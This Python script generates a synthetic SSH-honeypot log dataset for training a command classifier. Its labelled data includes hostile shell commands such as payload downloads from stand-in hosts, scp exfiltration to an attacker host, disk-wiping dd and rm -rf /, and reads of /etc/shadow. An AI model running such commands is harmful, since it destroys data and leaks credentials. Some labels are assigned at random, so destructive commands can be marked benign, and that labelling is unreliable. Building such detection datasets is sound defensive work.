#!/usr/bin/env python3
import json
import random
import datetime
import os
import argparse

# Set dataset directory
DATASET_DIR = "model_assets"
os.makedirs(DATASET_DIR, exist_ok=True)

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def random_task():
    return f"Task-{random.randint(1000, 9999)}"

# Static command dictionary
command_classification = {
    "cat welcome.txt": ("BENIGN", "INFO"),
    "cat notes.txt": ("BENIGN", "INFO"),
    "cat /home/user/todo.txt": ("BENIGN", "INFO"),
    "cat .bashrc": ("BENIGN", "INFO"),
    "cat readme.md": ("BENIGN", "INFO"),
    "cat /home/user/info.txt": ("BENIGN", "INFO"),
    "ls -al": ("BENIGN", "INFO"),
    "whoami": ("BENIGN", "INFO"),
    "pwd": ("BENIGN", "INFO"),
    "echo 'hello'": ("BENIGN", "INFO"),
    "mkdir test": ("BENIGN", "INFO"),
    "ifconfig": ("BENIGN", "INFO"),
    "ping google.com": ("BENIGN", "INFO"),
    "df -h": ("BENIGN", "INFO"),
    "du -sh": ("BENIGN", "INFO"),
    "find / -name 'test'": ("BENIGN", "INFO"),
    "top -n 1": ("BENIGN", "INFO"),
    "cat homework.txt": ("BENIGN", "INFO"),
    "cat /var/log/auth.log": ("SUSPICIOUS", "WARNING"),
    "curl https://safe-site.org/update.sh": ("BENIGN", "INFO"),
    "sudo apt update": ("BENIGN", "INFO"),
    "sudo apt install net-tools": ("SUSPICIOUS", "WARNING"),
    "uname -a": ("SUSPICIOUS", "WARNING"),
    "ps aux": ("SUSPICIOUS", "WARNING"),
    "netstat -tulnp": ("SUSPICIOUS", "WARNING"),
    "sudo su": ("SUSPICIOUS", "WARNING"),
    "sudo -l": ("SUSPICIOUS", "WARNING"),
    "cd /root": ("SUSPICIOUS", "WARNING"),
    "cat /etc/passwd": ("MALICIOUS", "ERROR"),
    "cat /etc/shadow": ("MALICIOUS", "ERROR"),
    "history": ("SUSPICIOUS", "WARNING"),
    "ls /root/": ("SUSPICIOUS", "WARNING"),
    "cat /var/log/syslog": ("SUSPICIOUS", "WARNING"),
    "cat /root/.bashrc": ("SUSPICIOUS", "WARNING"),
    "env": ("SUSPICIOUS", "WARNING"),
    "which python": ("SUSPICIOUS", "WARNING"),
    "cat ~/.ssh/known_hosts": ("SUSPICIOUS", "WARNING"),
    "curl http://unknown.site/script.sh": ("SUSPICIOUS", "WARNING"),
    "grep root /etc/passwd": ("SUSPICIOUS", "WARNING"),
    "watch netstat -an": ("SUSPICIOUS", "WARNING"),
    "grep 'password' /etc/passwd": ("MALICIOUS", "ERROR"),
    "wget http://malicious.com/payload.sh": ("MALICIOUS", "ERROR"),
    "curl -O http://malicious.com/malware.bin": ("MALICIOUS", "ERROR"),
    "rm -rf /": ("MALICIOUS", "ERROR"),
    "mv /bin/bash /tmp/bash": ("MALICIOUS", "ERROR"),
    "chmod 777 /etc/shadow": ("MALICIOUS", "ERROR"),
    "scp file.txt attacker@remote:/tmp/": ("MALICIOUS", "ERROR"),
    "ssh -L 8080:target.com:80 attacker@remote": ("MALICIOUS", "ERROR"),
    "iptables -F": ("MALICIOUS", "ERROR"),
    "echo 'hacked' > /root/.bashrc": ("MALICIOUS", "ERROR"),
    "dd if=/dev/zero of=/dev/sda": ("MALICIOUS", "ERROR"),
    "rm -rf /* --no-preserve-root": ("MALICIOUS", "ERROR"),
    "echo 'malware' > /tmp/malware.sh": ("MALICIOUS", "ERROR"),
    "cat notes.txt": ("BENIGN", "INFO"),
    "echo 'hello world'": ("BENIGN", "INFO"),
    "touch homework.doc": ("BENIGN", "INFO"),
    "cat /home/user/info.txt": ("BENIGN", "INFO")
}

# Dynamic realistic command generator
def generate_dynamic_command():
    templates = [
        "scp {file} {user}@{host}:{path}",
        "sudo apt install {package}",
        "curl https://{domain}/{filename}",
        "echo '{msg}' >> {filepath}",
        "curl -O http://{domain}/{filename}",
        "wget http://{domain}/{filename}",
        "echo '{msg}' > {filepath}",
        "chmod 777 {filepath}",
        "cat {filepath}",
        "rm -rf {dir}",
        "ps aux | grep {proc}",
        "cd {path}",
        "ls {path}"
    ]
    placeholders = {
        "package": ["net-tools", "htop", "nmap"],
        "file": ["file.txt", "data.tar.gz", "backup.sql"],
        "user": ["root", "admin", "user"],
        "host": ["192.168.0.2", "malicious.com", "backup.server"],
        "path": ["/tmp/", "/var/www", "/root/"],
        "domain": ["evil.com", "fileshare.com", "suspicious.org"],
        "filename": ["payload.sh", "exploit.zip", "update.bin"],
        "msg": ["hacked", "owned", "pwned"],
        "filepath": ["/etc/shadow", "/root/.bashrc", "/var/log/syslog"],
        "dir": ["/", "/var/", "/home/user"],
        "proc": ["sshd", "nginx", "mysql"]
    }

    template = random.choice(templates)
    for key in placeholders:
        template = template.replace(f"{{{key}}}", random.choice(placeholders[key]))
    return template

# Text distortion for realism
def augment_command(command):
    if random.random() < 0.3:
        command = command.upper() if random.random() < 0.5 else command.lower()
    if random.random() < 0.3:
        command = " " + command if random.random() < 0.5 else command + " "
    words = command.split()
    if len(words) > 1 and random.random() < 0.3:
        i = random.randint(0, len(words) - 2)
        words[i] = words[i] + "  "
        command = " ".join(words)
    return command

def generate_log_entry():
    if random.random() < 0.3:
        # 30% chance to generate dynamic command
        command = generate_dynamic_command()
        classification = random.choice(["BENIGN", "SUSPICIOUS", "MALICIOUS"])
        log_level = {"BENIGN": "INFO", "SUSPICIOUS": "WARNING", "MALICIOUS": "ERROR"}[classification]
    else:
        command, (classification, log_level) = random.choice(list(command_classification.items()))

    if random.random() < 0.5:
        command = augment_command(command)

    log_entry = {
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "level": log_level,
        "task_name": random_task(),
        "src_ip": random_ip(),
        "src_port": random.randint(1024, 65535),
        "dst_ip": "192.168.1.100",
        "dst_port": 22,
        "event": "Session summary",
        "details": command,
        "judgement": classification,
        "sensor_name": "my_honeypot",
        "sensor_protocol": "ssh",
        "command": command,
        "classification": classification,
        "prediction": f"[[{random.uniform(0, 1):.2f}, {random.uniform(0, 1):.2f}, {random.uniform(0, 1):.2f}]]"
    }
    return log_entry

def generate_logs(num_logs):
    logs = [generate_log_entry() for _ in range(num_logs)]
    log_file_path = os.path.join(DATASET_DIR, "honeypot_logs.json")
    with open(log_file_path, "w") as f:
        json.dump(logs, f, indent=4)
    return logs, log_file_path

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Generate honeypot log dataset.")
    parser.add_argument("--num_logs", type=int, default=50000, help="Number of log entries to generate (default: 50000)")
    args = parser.parse_args()

    logs, path = generate_logs(args.num_logs)
    print(f"✅ Honeypot logs saved to: {path}")